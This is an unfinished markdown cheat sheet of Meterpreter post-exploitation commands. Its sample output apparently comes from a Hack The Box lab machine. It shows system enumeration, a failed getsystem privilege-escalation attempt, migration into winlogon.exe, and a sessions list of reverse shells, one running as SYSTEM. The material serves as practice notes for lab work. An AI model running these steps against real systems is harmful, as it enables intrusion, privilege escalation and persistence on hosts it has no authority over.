# meterpreter

### TL;DR
```
sysinfo
getuid
getsid
getsystem
getpid
migrate <to-new-PID>
ps <string-to-search>
ps -S <string-to-search>
sessions
```
### 
```

```
### 
```

```
### 
```

```

### Syntax
```

```
## Examples 

### sysinfo
```
meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
```

### getuid
```
meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter >
```

### getsid
```
meterpreter > getsid
Server SID: S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550
```

### getsystem
```
meterpreter > getsystem 
[-] priv_elevate_getsystem: Operation failed: 1726 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
meterpreter >
```

### getpid
```
meterpreter > getpid
Current pid: 1572
meterpreter >
```

### migrate <to-new-PID>
```
meterpreter > migrate 432
[*] Migrating from 1572 to 432...
...
[*] Migration completed successfully.
meterpreter > 
```

### getpid
```
meterpreter > getpid
Current pid: 432
meterpreter >
```

### ps <string-to-search>
```
meterpreter > ps w3
Filtering on 'w3'

Process List
============

 PID   PPID  Name      Arch  Session  User             Path
 ---   ----  ----      ----  -------  ----             ----
 1572  1600  w3wp.exe  x86   0        IIS APPPOOL\Web  c:\windows\system32\inetsrv\w3wp.exe
```

### ps <string-to-search>
```
meterpreter > ps win
Filtering on 'win'

Process List
============

 PID  PPID  Name          Arch  Session  User  Path
 ---  ----  ----          ----  -------  ----  ----
 376  304   wininit.exe
 432  368   winlogon.exe  x86   1              C:\Windows\system32\winlogon.exe
```

### ps -S <string-to-search>
```
meterpreter > ps -S winlogon
Filtering on 'winlogon'

Process List
============

 PID  PPID  Name          Arch  Session  User  Path
 ---  ----  ----          ----  -------  ----  ----
 432  368   winlogon.exe  x86   1              C:\Windows\system32\winlogon.exe
```

### sessions
```
msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL      10.10.16.52:1234 -> 10.10.10.5:49456 (10.10.10.5)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL  10.10.16.52:1234 -> 10.10.10.5:49453 (10.10.10.5)
```

### 
```

```

### 
```

```
